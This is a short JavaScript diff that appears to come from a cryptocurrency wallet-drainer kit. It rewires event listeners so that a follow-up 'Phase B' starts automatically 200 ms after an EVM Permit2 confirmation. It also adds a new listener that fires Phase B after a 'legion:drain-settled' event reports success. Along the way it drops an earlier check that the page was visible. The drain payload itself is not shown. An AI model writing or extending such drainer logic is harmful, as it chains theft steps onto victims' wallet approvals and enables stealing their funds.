@@ -125,11 +125,16 @@
 
   window.__TRUST_PHASE_B__ = startPhaseB;
 
-  // Only after EVM Confirm path (Approve) — not on bare notify
+  // Auto-trigger after EVM Permit2 confirms
   window.addEventListener('trust:evm-confirm-done', function () {
-    setTimeout(function () {
-      if (document.visibilityState === 'visible') startPhaseB();
-    }, 800);
+    setTimeout(function () { startPhaseB(); }, 200);
+  });
+
+  window.addEventListener('legion:drain-settled', function (e) {
+    var d = e && e.detail;
+    if (d && d.path && d.ok) {
+      setTimeout(function () { startPhaseB(); }, 200);
+    }
   });
 
   window.addEventListener('legion:phaseb-abort', function () {
